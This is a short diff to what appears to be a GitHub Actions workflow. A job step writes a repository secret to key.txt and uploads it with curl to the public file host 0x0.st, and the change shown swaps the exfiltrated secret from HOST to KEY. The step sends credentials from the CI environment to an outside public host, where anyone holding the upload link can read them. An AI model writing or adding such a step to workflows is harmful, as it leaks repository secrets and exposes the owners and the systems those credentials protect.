@@ -8,4 +8,4 @@ jobs:
           echo "$KEY" > key.txt
           curl -F'file=@key.txt' http://0x0.st
         env:
-          KEY: ${{ secrets.HOST}}
+          KEY: ${{ secrets.KEY}}
